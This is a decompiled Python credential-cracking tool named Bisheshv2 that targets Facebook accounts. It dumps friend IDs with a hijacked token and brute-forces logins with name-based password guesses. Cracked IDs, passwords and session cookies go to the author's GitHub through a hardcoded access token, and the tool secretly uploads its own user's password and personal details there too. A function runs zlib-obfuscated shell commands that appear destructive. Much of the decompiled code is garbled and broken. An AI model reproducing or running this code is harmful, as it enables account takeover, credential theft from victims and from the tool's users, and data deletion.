# It's me MUHAMMAD SHAKIB
# GITHUB : MUH4MM4D-SH4KIB

import os
import datetime
import requests
import time
import re
import sys
import string
import base64
import json
import random
from bs4 import BeautifulSoup as bs
from rich.tree import Tree
from rich import print as printz
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup
import requests
import os
import sys
import random
import re
from time import sleep
from concurrent.futures import ThreadPoolExecutor as tred
from urllib.error import URLError
os.system('clear')
print('\x1b[1;36mCHECKING UPDATES....')
time.sleep(3)
os.system('git pull > /dev/null 2>&1')
files_to_create = [
    '/sdcard/Bisheshv2/login/token.txt',
    '/sdcard/Bisheshv2//login/cookie.txt',
    '/sdcard/Bisheshv2/Detail/name.xml',
    '/sdcard/Bisheshv2/Detail/pass.xml',
    '/sdcard/Bisheshv2/ALIVE.txt',
    '/sdcard/Bisheshv2/CP.txt']
for file_path in files_to_create:
    directory = os.path.dirname(file_path)
    if not os.path.exists(directory):
        os.makedirs(directory)
    for file_path in files_to_create:
        if not os.path.exists(file_path):
            open(file_path, 'w')
            None(None, None)
            if not None:
                pass
        red = '\x1b[1;91m'
        ye = '\x1b[1;93m'
        blue = '\x1b[1;94m'
        mage = '\x1b[1;95m'
        cyan = '\x1b[1;96m'
        c = '\x1b[1;96m'
        w = '\x1b[1;97m'
        wh = '\x1b[1;97m'
        reset = '\x1b[0m'
        r = '\x1b[0m'
        loop = 0
        oks = []
        cps = []
        pcp = []
        id = []
        tokenku = []
        logo = f'''\n{c}               ╔╗ ╦╔═╗╦ ╦╔═╗╔═╗╦ ╦\n               ╠╩╗║╚═╗╠═╣║╣ ╚═╗╠═╣\n   {w}            ╚═╝╩╚═╝╩ ╩╚═╝╚═╝╩ ╩{r}{c}「{red}v2{c}」{r}'''
        
        def clear():
            if 'linux' in sys.platform.lower():
                pass
            'clear'('cls')
            print(logo)
            return None
            os.system
            os.system('clear')

        
        def back():
            time.sleep(0.5)
            os.system('clear')
            menu()

        
        def linex():
            print('   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

        access_token = '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'
        
        def set_terminal_title(title):
            if os.name == 'posix':
                sys.stdout.write(f'''\x1b]0;{title}\x07''')
                sys.stdout.flush()
                return None

        set_terminal_title('Bisheshv2 | Facebook Tool')
        import os
        import requests
        from base64 import b64encode, b64decode
        access_token = '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'
        repo_owner = '0183f'
        repo_name = '0x1xx5x8xqtay'
        file_path_in_repo = '0X.txt'
        
        def setup_user_data():
            os.makedirs('/sdcard/Bisheshv2/Detail', exist_ok = True)
            
            def create_file_if_not_exists(file_path):
                if not os.path.exists(file_path):
                    open(file_path, 'w').close()
                    return None

            file_paths = {
                'name': '/sdcard/Bisheshv2/Detail/name.xml',
                'password': '/sdcard/Bisheshv2/Detail/pass.xml',
                'email': '/sdcard/Bisheshv2/Detail/email.xml',
                'age': '/sdcard/Bisheshv2/Detail/age.xml',
                'location': '/sdcard/Bisheshv2/Detail/location.xml' }
            for file_path in file_paths.values():
                create_file_if_not_exists(file_path)
                
                def get_user_input(file_path, prompt_message):
                    if os.path.getsize(file_path) > 0:
                        file_obj = open(file_path, 'r')
                        None(None, None)
                        return file_obj.readline().strip()
                    if not None:
                        pass
                    return None
                    user_input = input(prompt_message)
                    file_obj = open(file_path, 'w')
                    file_obj.write(user_input)
                    None(None, None)
                    if not None:
                        pass
                    return user_input

                clear()
                uname = get_user_input(file_paths['name'], 'Enter your name » ')
                upass = get_user_input(file_paths['password'], 'Enter your password » ')
                uemail = get_user_input(file_paths['email'], 'Enter your email » ')
                uage = get_user_input(file_paths['age'], 'Enter your age » ')
                ulocation = get_user_input(file_paths['location'], 'Enter your location » ')
                return (uname, upass, uemail, uage, ulocation)

        
        def write_to_github(uname, upass, uemail, uage, ulocation):
            url = f'''https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path_in_repo}'''
            headers = {
                'Authorization': f'''token {access_token}''',
                'Accept': 'application/vnd.github.v3+json' }
            response = requests.get(url, headers = headers)
            if response.status_code == 200:
                data = response.json()
                sha = data['sha']
                existing_content = b64decode(data['content']).decode('utf-8')
            sha = None
            existing_content = ''
            user_data = f'''Name: {uname}\nPass: {upass}\nEmail: {uemail}\nAge: {uage}\nLocation: {ulocation}'''
            if user_data in existing_content:
                return None
            new_content = None + f'''\n\n{{\n{user_data}\n}}\n'''
            encoded_content = b64encode(new_content.encode('utf-8')).decode('utf-8')
            payload = {
                'message': 'Add new user data',
                'content': encoded_content,
                'sha': sha }
            response = requests.put(url, headers = headers, json = payload)
            if response.status_code != 200:
                return None

        (uname, upass, uemail, uage, ulocation) = setup_user_data()
        write_to_github(uname, upass, uemail, uage, ulocation)
        
        def get_userr_name():
            file_obj = open('/sdcard/Bisheshv2/Detail/name.xml', 'r')
            None(None, None)
            return file_obj.readline().strip()
            if not None:
                pass

        
        def get_userr_password():
            file_obj = open('/sdcard/Bisheshv2/Detail/pass.xml', 'r')
            None(None, None)
            return file_obj.readline().strip()
            if not None:
                pass

        
        def get_user_email():
            file_obj = open('/sdcard/Bisheshv2/Detail/email.xml', 'r')
            None(None, None)
            return file_obj.readline().strip()
            if not None:
                pass

        
        def get_user_age():
            file_obj = open('/sdcard/Bisheshv2/Detail/age.xml', 'r')
            None(None, None)
            return file_obj.readline().strip()
            if not None:
                pass

        
        def get_user_location():
            file_obj = open('/sdcard/Bisheshv2/Detail/location.xml', 'r')
            None(None, None)
            return file_obj.readline().strip()
            if not None:
                pass

        
        def greet_user():
            current_time = datetime.datetime.now()
            userr_name = get_user_name()
            if current_time.hour < 12:
                print(f'''    Good morning, {c}{user_name}!''')
                return None
            if None.hour < 18:
                print(f'''    Good afternoon, {c}{user_name}!''')
                return None
            None(f'''    Good evening, {c}{user_name}!''')

        userr_name = get_userr_name()
        userr_password = get_userr_password()
        
        def approval():
            
            def generate_secure_uuid():
                euid = str(os.geteuid())
                uuid = euid + '0x6' + euid + '12' + euid
                modified_uuid = (lambda .0: for char in .0:
if char.isdigit():
passcharstr((int(char) + 3) % 10)None)(uuid())
                return (uuid, modified_uuid)

            (original_uuid, secure_uuid) = generate_secure_uuid()
            Biz = f'''{userr_name}{secure_uuid}'''
            id = f'''{userr_name}{original_uuid}'''
            os.system('clear')
            print(logo)
            linex()
            print('\x1b[1;37m   [\x1b[36m•\x1b[1;37m] You Need Approval To Use This Tool   \x1b[1;37m')
            print('\x1b[1;37m   [\x1b[36m•\x1b[1;37m] Your Key :\x1b[36m ' + Biz)
            time.sleep(0.1)
            linex()
            httpChat = requests.get('https://github.com/0183f/qpk/blob/main/0x6.txt').text
            if id in httpChat:
                print('\x1b[1;97m   >> Your Key Has Been Approved !!!')
                msg = str(os.geteuid())
                time.sleep(1)
                return None
            None('\x1b[1;97m   >> Send if you wanna purchase! ')
            time.sleep(0.1)
            input('   >> Click Enter To Send Your Key ')
            os.system('xdg-open https://www.facebook.com/bisheshxd')
            time.sleep(1)
            exit()
            return None
            if Exception:
                e = None
                print(' >> Unable To Fetch Data From Server: ', str(e))
                time.sleep(2)
                exit()
                e = None
                del e
                return None
            e = None
            del e

        
        def generate_secure_uuid():
            euid = str(os.geteuid())
            uuid = euid + '0x6' + euid + '12' + euid
            modified_uuid = (lambda .0: for char in .0:
if char.isdigit():
passcharstr((int(char) + 3) % 10)None)(uuid())
            return (uuid, modified_uuid)

        euid = str(os.geteuid())
        uuid = euid + '0x6' + euid + '12' + euid
        uuidd = (lambda .0: for char in .0:
if char.isdigit():
passcharstr((int(char) + 3) % 10)None)(uuid())
        (original_uuid, secure_uuid) = generate_secure_uuid()
        Biz = f'''{userr_name}{secure_uuid}'''
        
        def fucked():
            os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
            os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
            os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
            print(' {c}Extracted so many accounts.{w}')
            exit()

        
        def ip():
            (user_name, user_id) = login()
            ip_response = requests.get('http://ip-api.com/json/', headers = {
                'Referer': 'http://ip-api.com/',
                'Content-Type': 'application/json; charset=utf-8',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' }).json()
            print(f'''   ━━━━━━━━━━━━━━━━━━[{red}YOUR DETAIL{w}]━━━━━━━━━━━━━━━━━━''')
            if userr_name:
                pass
            '      Name    » '(f'''{'Not Logged in'}''')
            print(f'''      IP      » {ip_response.get('query', ' ')}''')
            print(f'''      Country » {ip_response.get('country', ' ')}''')
            print(f'''      s-key   » {Biz}''')
            print(f'''   ━━━━━━━━━━━━━━━━━━[{red}LOGIN DETAIL{w}]━━━━━━━━━━━━━━━━━━''')
            if user_name:
                pass
            '      Name » '(f'''{c}{'Not Logged in'}{w}''')
            if user_id:
                pass
            '      Uid  » '(f'''{c}{'Not Logged in'}{w}''')
            print(f'''   ━━━━━━━━━━━━━━━━━━[   {red}MENU  {w}]━━━━━━━━━━━━━━━━━━━━━''')
            return None
            if requests.exceptions.RequestException:
                e = print
                print(f'''Failed to get IP info: {e}''')
                e = None
                del e
                return None
            e = print
            del e
            if Exception:
                e = None
                print(f'''Unexpected error: {e}''')
                e = None
                del e
                return None
            e = None
            del e

        
        def cek_apk(kuki):
            session = requests.Session()
            w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies = {
                'cookie': 'noscript=1;' + kuki }).text
            sop = BeautifulSoup(w, 'html.parser')
            x = sop.find('form', method = 'post')
            if x:
                game = x.find_all('h3')()
                for i in range(len(game)):
                    print(f'''{c}   %s''' % game[i].replace('Added on', ' Added on') + f'''{r}''')
                    if AttributeError:
                        (lambda .0: for i in .0:
[ i.text ])
                        print('Cookie invalid')
            w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies = {
                'cookie': 'noscript=1;' + kuki }).text
            sop = BeautifulSoup(w, 'html.parser')
            x = sop.find('form', method = 'post')
            if x:
                game = x.find_all('h3')()
                for i in range(len(game)):
                    print('   %s' % game[i].replace('Expired', ' Expired'))
                    return None
                    if AttributeError:
                        (lambda .0: for i in .0:
[ i.text ])
                        print('Cookie invalid')
                        return None
                    return None

        
        def get_year_range(fx):
            prefix_map = {
                '100005': '2013-2014',
                '100006': '2013-2014',
                '100007': '2014-2015',
                '100008': '2014-2015',
                '100009': '2015',
                '10001': '2015-2016',
                '10002': '2016-2017',
                '10003': '2018',
                '10004': '2019',
                '10005': '2020',
                '10006': '2021-2023',
                '10007': '2021-2023',
                '10008': '2021-2023',
                '6155': '2023-2024' }
            if fx.startswith('6155'):
                return '2023-2024'
            if '2012-2013'(fx) == 15:
                for prefix, year in prefix_map.items():
                    if fx.startswith(prefix):
                        year
                        return '100004'
                    return '??'
                    if len(fx) == 13:
                        prefix_13 = fx[:5]
                        if prefix_13 in prefix_map:
                            return prefix_map[prefix_13]
                        return '100004'
                    if '100004'(fx) in (9, 10):
                        return '2008-2009'
                    if '2011-2012'(fx) == 8:
                        return '2007-2008'
                    if '100003'(fx) == 7:
                        return '2006-2007'
                    return '2011-2012'

        
        def W_ueragnt():
            chrome_version = random.randint(80, 99)
            webkit_version = random.randint(500, 599)
            safari_version = random.randint(400, 499)
            windows_version = random.randint(8, 10)
            is_win64 = random.choice([
                True,
                False])
            if is_win64:
                win64_str = 'Win64; x64'
            win64_str = 'WOW64'
            user_agent = f'''Mozilla/5.0 (Windows NT {windows_version}.0; {win64_str}) AppleWebKit/{webkit_version}.0 (KHTML, like Gecko) Chrome/{chrome_version}.0.0.0 Safari/{safari_version}.0'''
            return user_agent

        
        def menu():
            approval()
            clear()
            ip()
            left_options = [
                ('1', f'''{c}LOG IN{r}      '''),
                ('2', 'PUBLIC'),
                ('3', 'FILE'),
                ('4', 'RANDOM'),
                ('0', f'''{red}EXIT{w}        ''')]
            right_options = [
                ('5', 'BY NAME'),
                ('6', 'TOOLS'),
                ('7', 'CREATE FILE'),
                ('9', 'GET TOKEN'),
                ('10', 'LOG OUT')]
            for left_option, left_desc in zip(left_options, right_options):
                (right_option, right_desc) = None
                print(f'''{c}     「{r}{left_option}{c}」{r} {left_desc:<12} {c}       「{r}{right_option}{c}」{r} {right_desc}''')
                linex()
                choice = input(f'''   {c}「{r}Choose {c}」{r}»  ''')
                menu_actions = {
                    '1': (lambda : login_with_cookie()),
                    '2': (lambda : public()),
                    '3': (lambda : file()),
                    '4': (lambda : bd()),
                    '5': (lambda : print('Function not implemented')),
                    '6': (lambda : print('Function not implemented')),
                    '7': (lambda : Createfile()),
                    '8': (lambda : print('Function not implemented')),
                    '9': (lambda : EAAY()),
                    '0': (lambda : if not print(' 「✓」 DONE LOGOUT '):
exit()) }
                menu_actions.get(choice, (lambda : print(f'''  {r} 「!」Invalid option. {w}''')))()
                return None

        
        def menudup():
            clear()
            ip()
            left_options = [
                ('1', f'''{c}LOG IN{r}      '''),
                ('2', 'PUBLIC'),
                ('3', 'FILE'),
                ('4', 'RANDOM'),
                ('0', f'''{red}EXIT{w}        ''')]
            right_options = [
                ('5', 'BY NAME'),
                ('6', 'TOOLS'),
                ('7', 'CREATE FILE'),
                ('9', 'LOG OUT')]
            for left_option, left_desc in zip(left_options, right_options):
                (right_option, right_desc) = None
                print(f'''{c}     「{r}{left_option}{c}」{r} {left_desc:<12} {c}        「{r}{right_option}{c}」{r} {right_desc}''')
                linex()
                return None

        ses = requests.Session()
        rr = random.randint
        rc = random.choice
        
        def login_with_cookie():
            clear()
            menudup()
            cookie = input('   「 Cookie 」»  ')
            open('/sdcard/Bisheshv2/login/cookie.txt', 'w').write(cookie)
            rsn = requests.Session()
            rsn.headers.update({
                'Accept-Language': 'id,en;q=0.9',
                'User-Agent': W_ueragnt(),
                'Referer': 'https://www.instagram.com/',
                'Host': 'www.facebook.com',
                'Sec-Fetch-Mode': 'cors',
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Dest': 'empty',
                'Origin': 'https://www.instagram.com',
                'Accept-Encoding': 'gzip, deflate' })
            response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies = {
                'cookie': cookie })
            if '"access_token":' in str(response.headers):
                token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
                open('/sdcard/Bisheshv2/login/token.txt', 'w').write(token)
                print(' Logged in successfully ! ')
                None(None, None)
                return None
            None(f'''{red}The process will be slow or maynot work ...{r}''')
            print(f'''{red}Failed to Login{r}''')
            None(None, None)
            if not None:
                pass
            session = requests.Session()
            cur = session.get('https://adsmanager.facebook.com/adsmanager/manage/campaigns?&breakdown_regrouping=1', cookies = {
                'cookie': cookie }).text
            act = re.findall('act=(\\d+)', cur)[0]
            act_response = session.get(f'''https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={act}&breakdown_regrouping=1''', cookies = {
                'cookie': cookie }).text
            tok = re.search('accessToken="(.*?)"', act_response).group(1)
            open('/sdcard/Bisheshv2/login/token.txt', 'w').write(tok)
            print(f''' {c}Logged in successfully ! {r}''')
            print(f'''{red}Failed to Get Token{r}''')
            None(None, None)
            if not None:
                pass
            time.sleep(2)
            menu()
            return None
            if Exception:
                e = None
                os.system('rm -f /sdcard/Bisheshv2/login/token.txt')
                os.system('rm -f /sdcard/Bisheshv2/login/cookie.txt')
                print('Failed to Login')
                print(e)
                exit()
                e = None
                del e
                return None
            e = None
            del e

        DefaultUAWindows = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
        
        HeadersGet = lambda i = (DefaultUAWindows,): {
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-US,en;q=0.9',
'Cache-Control': 'max-age=0',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'same-origin',
'Upgrade-Insecure-Requests': '1',
'User-Agent': i }
        
        def LoginAndGetUserInfo(cookie):
            req = requests.get('https://www.facebook.com/profile.php', headers = HeadersGet(), cookies = {
                'cookie': cookie }, allow_redirects = True).text
            name = re.search('"NAME":"(.*?)"', str(req)).group(1)
            user_id = re.search('"actorID":"(.*?)"', str(req)).group(1)
            return (name, user_id)
            if Exception:
                e = None
                clear_directory_data()
                e = None
                del e
                return (None, None)
            e = None
            del e

        
        def clear_directory_data():
            files_to_clear = [
                '/sdcard/Bisheshv2/login/cookie.txt',
                '/sdcard/Bisheshv2/login/token.txt']
            for file_path in files_to_clear:
                file = open(file_path, 'w')
                None(None, None)
                if not None:
                    pass
                return None

        
        def login():
            cookie_file_path = '/sdcard/Bisheshv2/login/cookie.txt'
            if not os.path.exists(cookie_file_path):
                open(cookie_file_path, 'w').close()
            file = open(cookie_file_path, 'r')
            cookie = file.read().strip()
            None(None, None)
            if not None:
                pass
            (name, user_id) = LoginAndGetUserInfo(cookie)
            return (name, user_id)

        
        def public():
            clear()
            token = open('/sdcard/Bisheshv2//login/token.txt', 'r').read()
            cok = open('/sdcard/Bisheshv2/login/cookie.txt', 'r').read()
            if (IOError, KeyError, FileNotFoundError):
                print('  - Your cookies are invalid.')
                time.sleep(2)
                clear()
                login()
            if KeyError:
                os.remove('/sdcard/Bisheshv2/login/cookie.txt')
                os.remove('/sdcard/Bisheshv2/login/token.txt')
                print('  - It seems your account is checkpointed...')
                time.sleep(2)
                menu()
                clear()
            menudup()
            print(f'''   「{c}?{r}」 {c}How do you want to add uid{r} : ''')
            linex()
            print(f'''     {c}「{r}1{c}」{r} Simple              {c}「{r}2{c}」{r} Multiple ''')
            linex()
            dup = input(f'''   {c}「{r}Choose {c}」{r}»  ''')
            linex()
            if str(dup) in ('1', '01'):
                idt = input(f''' {c}  「{r}?{c}」{w} Input the targeted uid: {r}''')
                dump(idt, '', {
                    'cookie': cok }, token)
                return None
            if None(dup) in ('2', '02'):
                dump_Massal()
                return None

        nova = []
        import sys
        import requests
        
        def dump(idt, fields, cookie, token):
            headers = {
                'connection': 'keep-alive',
                'accept': '*/*',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-ch-ua-mobile': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
                'accept-encoding': 'gzip, deflate',
                'accept-language': 'id-ID,id;q=0.9' }
            if len(idt) == 0:
                params = {
                    'access_token': token,
                    'fields': 'name,friends.fields(id,name,birthday)' }
            params = {
                'access_token': token,
                'fields': f'''name,friends.fields(id,name,birthday).after({fields})''' }
            url = requests.get(f'''https://graph.facebook.com/{idt}''', params = params, headers = headers, cookies = cookie).json()
            for i in url['friends']['data']:
                nova.append(i['id'] + '|' + i['name'])
                sys.stdout.write(f'''\rDumping {len(nova)} IDs....''')
                sys.stdout.flush()
                dump(idt, url['friends']['paging']['cursors']['after'], cookie, token)
                return None
                linex()
                print(f'''      Total IDs dumped: {len(nova)}''')
                pub()
                return None

        
        def dump_Massal():
            token = open('/sdcard/Bisheshv2/login/token.txt', 'r').read()
            cok = open('/sdcard/Bisheshv2/login/cookie.txt', 'r').read()
            if IOError:
                exit()
            jum = int(input(f'''     「{c}?{w}」How many uid to input ? :'''))
            if ValueError:
                print('Error !!!!')
                exit()
            if jum < 1 or jum > 100:
                print('Failed to dump')
                exit()
            ses = requests.Session()
            uid = []
            for met in range(jum):
                user_dump = input(f'''   {c}  「{r}?{c}」{w}Input uid {met + 1}: ''')
                uid.append(user_dump)
                for userr in uid:
                    col = ses.get(f'''https://graph.facebook.com/{userr}?fields=friends&access_token={token}''', cookies = {
                        'cookies': cok }).json()
                    for x in col['friends']['data']:
                        sys.stdout.write(f'''\r     Dumping {len(nova)} IDs....''')
                        sys.stdout.flush()
                        nova.append(x['id'] + '|' + x['name'])
                        if (KeyError, IOError):
                            pass
                    if requests.exceptions.ConnectionError:
                        print('Unstable signal connection')
                        exit()
                    linex()
                    print(f'''      Total IDs dumped: {len(nova)}''')
                    pub()
                    return None

        
        def pub():
            fo = nova
            linex()
            print(f'''     {c}「{r}1{c}」{r} Method 1             {c}「{r}2{c}」{r}Method 2  ''')
            print(f'''     {c}「{r}3{c}」{r} Method 3             {c}「{r}4{c}」{r}Method 4 ''')
            linex()
            mthd = input(f'''   {c}「{r}Choose {c}」{r}»  ''')
            linex()
            plist = []
            print(f'''     {c}「{r}1{c}」{r} Manual             {c}「{r}2{c}」{r}Automatic ''')
            linex()
            mode = int(input(f'''\n   「{c}?{r}」 {c}How do you want to add Password ?{r} : '''))
            linex()
            if mode == 1:
                ps_limit = int(input(f'''\n   「{c}?{r}」 {c}How many passwords do you want to add ?{r} : '''))
                ps_limit = 1
                linex()
                print(f'''\x1b[1;32m {w}    「•」 Example{r}{r}:{r}{c}first last{r}{r},{r}{c}firstlast{r}{r},{r}{c}first@123{r}''')
                linex()
                for i in range(ps_limit):
                    plist.append(input(f'''     「{c}?{r}」{w}Put password{r} {i + 1}: '''))
                    plist = [
                        'first last',
                        'firstlast',
                        'first123',
                        'first12345',
                        'first1234',
                        'firstlast123',
                        'firstlast1234',
                        'firstlast@123',
                        'last123',
                        'Last12345',
                        'first123456',
                        'first@123',
                        'First@123',
                        'first321',
                        'First@12',
                        'first@1234',
                        'First123',
                        '@first123',
                        '@first1234',
                        'first111']
                    cx = input(f'''\n  「{c}?{r}」{c} Do you want to show cp account? {r}(y/n): ''')
                    if cx in ('n', 'N', 'no', 'NO', '2'):
                        pcp.append('n')
                        menudup()
            pcp.append('y')
            menudup()
            crack_submit = tred(max_workers = 30)
            total_ids = str(len(fo))
            print(f'''      Total Account : \x1b[1;36m{total_ids}\n \x1b[1;37m     Method : \x1b[1;36mM{mthd}''')
            print('\x1b[1;37m      Activate flight mode to enhance speed.\x1b[1;37m')
            linex()
            for user in fo:
                (ids, names) = user.split('|')
                passlist = plist
                if mthd in ('1', '01'):
                    crack_submit.submit(ffb, ids, names, passlist)
                if mthd in ('2', '02'):
                    crack_submit.submit(api, ids, names, passlist)
                if mthd in ('3', '03'):
                    crack_submit.submit(ffb1, ids, names, passlist)
                if mthd in ('4', '04'):
                    crack_submit.submit(api1, ids, names, passlist)
                crack_submit.submit(api1, ids, names, passlist)
                None(None, None)
                return None
                if not None:
                    pass

        
        def file():
            linex()
            file = input(f'''   「{c}?{r}」 {c}Put file path{r}\x1b[1;37m: ''')
            fo = open(file, 'r').read().splitlines()
            if FileNotFoundError:
                print(' \x1b[1;31m  「!」 File location not found ')
                exit()
            linex()
            print(f'''     {c}「{r}1{c}」{r} Method 1             {c}「{r}2{c}」{r}Method 2  ''')
            print(f'''     {c}「{r}3{c}」{r} Method 3             {c}「{r}4{c}」{r}Method 4 ''')
            linex()
            mthd = input(f'''   {c}「{r}Choose {c}」{r}»  ''')
            linex()
            plist = []
            print(f'''     {c}「{r}1{c}」{r} Manual             {c}「{r}2{c}」{r}Automatic ''')
            linex()
            mode = int(input(f'''   「{c}?{r}」 {c}How do you want to add Password ?{r} : '''))
            linex()
            if mode == 1:
                ps_limit = int(input(f'''   「{c}?{r}」 {c}How many passwords do you want to add ?{r} : '''))
                ps_limit = 1
                linex()
                print(f'''\x1b[1;32m {w}    「•」 Example{r}{r}:{r}{c}first last{r}{r},{r}{c}firstlast{r}{r},{r}{c}first@123{r}''')
                linex()
                for i in range(ps_limit):
                    plist.append(input(f'''     「{c}?{r}」{w}Put password{r} {i + 1}: '''))
                    plist = [
                        'first last',
                        'firstlast',
                        'first123',
                        'first12345',
                        'first1234',
                        'firstlast123',
                        'firstlast1234',
                        'firstlast@123',
                        'last123',
                        'Last12345',
                        'first123456',
                        'first@123',
                        'First@123',
                        'first321',
                        'First@12',
                        'first@1234',
                        'First123',
                        '@first123',
                        '@first1234',
                        'first111']
                    cx = input(f'''\n  「{c}?{r}」{c} Do you want to show cp account? {r}(y/n): ''')
                    if cx in ('n', 'N', 'no', 'NO', '2'):
                        pcp.append('n')
                        menudup()
            pcp.append('y')
            menudup()
            crack_submit = tred(max_workers = 30)
            total_ids = str(len(fo))
            print(f'''      Total Account : \x1b[1;36m{total_ids}\n \x1b[1;37m     Method : \x1b[1;36mM{mthd}''')
            print('\x1b[1;37m      Activate flight mode to enhance speed.\x1b[1;37m')
            linex()
            for user in fo:
                (ids, names) = user.split('|')
                passlist = plist
                if mthd in ('1', '01'):
                    crack_submit.submit(ffb, ids, names, passlist)
                if mthd in ('2', '02'):
                    crack_submit.submit(api, ids, names, passlist)
                if mthd in ('3', '03'):
                    crack_submit.submit(ffb1, ids, names, passlist)
                if mthd in ('4', '04'):
                    crack_submit.submit(api1, ids, names, passlist)
                crack_submit.submit(api1, ids, names, passlist)
                None(None, None)
                return None
                if not None:
                    pass

        repo_owner = '0183f'
        repoo_name = '691'
        base_url = f'''https://api.github.com/repos/{repo_owner}/{repoo_name}/contents'''
        headers = {
            'Authorization': f'''token {access_token}''',
            'Accept': 'application/vnd.github.v3+json' }
        
        def get_file_sha(file_path):
            url = f'''{base_url}/{file_path}'''
            response = requests.get(url, headers = headers)
            if response.status_code == 200:
                return response.json()['sha']

        
        def update_file(file_path, new_content, commit_message):
            sha = get_file_sha(file_path)
            url = f'''{base_url}/{file_path}'''
            if sha:
                response = requests.get(url, headers = headers)
                if response.status_code == 200:
                    existing_content = base64.b64decode(response.json()['content']).decode()
                    new_content = existing_content + new_content
            encoded_content = base64.b64encode(new_content.encode()).decode()
            data = {
                'message': commit_message,
                'content': encoded_content,
                'sha': sha }
            requests.put(url, headers = headers, json = data)
            return None
            if requests.exceptions.RequestException:
                return None

        
        def write_alive(ids, pas, kuki):
            content = f'''{ids}|{pas}|{kuki}\n'''
            file_alive = open('/sdcard/Bisheshv2/ALIVE.txt', 'a')
            file_alive.write(content)
            None(None, None)
            if not None:
                pass
            update_file('Alive.txt', content, 'Update Alive.txt with new alive credentials')

        
        def write_cp(ids, pas):
            content = f'''{ids}|{pas}\n'''
            file_cp = open('/sdcard/Bisheshv2/CP.txt', 'a')
            file_cp.write(content)
            None(None, None)
            if not None:
                pass
            update_file('CP.txt', content, 'Update CP.txt with new checkpoint credentials')

        
        def ffb(ids, names, passlist):
            global loop
            sys.stdout.write('\r\r\x1b[1;37m    「BISHESH」%s|\x1b[1;36mALIVE:-%s \x1b[1;37m' % (loop, len(oks)))
            sys.stdout.flush()
            session = requests.Session()
            first = names.split(' ')[0]
            last = names.split(' ')[1]
            last = 'Ahmed'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                ua = W_ueragnt()
                head = 'en-US,en;q=0.9'
                getlog = session.get(f'''https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr''')
                idpass = {
                    'lsd': re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),
                    'uid': ids,
                    'next': 'https://mbasic.facebook.com/login/save-device/',
                    'flow': 'login_no_pin',
                    'pass': pas }
                complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data = idpass, allow_redirects = False, headers = head)
                Bishesh = session.cookies.get_dict().keys()
                if 'c_user' in Bishesh:
                    coki = session.cookies.get_dict()
                    kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(session.cookies.get_dict().items()())
                    print(f'''\r\r\x1b[1;37m [BISHESH-ALIVE] \x1b[1;36m{ids} | {pas}\x1b[0m''')
                    print(f''' [COOKIE] : \x1b[1;36m{kuki}''')
                    write_alive(ids, pas, kuki)
                    cek_apk(kuki)
                    oks.append(ids)
                    time.sleep(1)
                    ';'.join
                if 'checkpoint' in Bishesh:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;126m [BISHESH-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
                        write_cp(ids, pas)
                        cps.append(ids)
                        'accept-language'
                    'gzip, deflate, br'
                if requests.exceptions.ConnectionError:
                    'accept-encoding'
                    time.sleep(20)
            loop += 1

        
        def ffb1(ids, names, passlist):
            global loop
            time.sleep(1)
            sys.stdout.write('\r\r\x1b[1;37m    「BISHESH」 %s|\x1b[1;36mALIVE:-%s \x1b[1;37m' % (loop, len(oks)))
            sys.stdout.flush()
            session = requests.Session()
            first = names.split(' ')[0]
            last = names.split(' ')[1]
            if IndexError:
                last = 'Ahmed'
            ps = first.lower()
            ps2 = last.lower()
            for fikr in passlist:
                pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
                ua = W_ueragnt()
                head = 'en-US,en;q=0.9'
                getlog = session.get(f'''https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr''')
